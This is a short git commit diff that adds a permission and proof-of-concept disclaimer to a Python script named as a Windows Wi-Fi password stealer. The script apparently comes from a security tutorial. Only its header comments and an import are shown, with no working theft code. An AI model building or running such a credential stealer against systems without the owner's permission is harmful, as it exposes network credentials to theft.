6f8cdb1e259dc2919eff50aeea7759366ce42a35
jb-williams <jb.williams016@gmail.com>
2022-09-12 19:03:04 -0500

    updates

--- sec_tools/base_winwifi_stealer/win_wifi_stealer.py
+++ sec_tools/base_winwifi_stealer/win_wifi_stealer.py
@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 #**!!Both of these were made from tutorials of TCM-The Cyber Mentor!!**
 #https://github.com/hmaverickadams
+#!! WARNING !! This is just a proof of concept is is not meant for any real world application. DO NOT USE this script on any systems you don't have written, explicit permission for owner to do so USE At OWN RISK, I am not responsible for ANY out come due to the usage of this script. !! WARNING !!
 
 # Specifically to steal Windows Wifi Passwords
 import subprocess
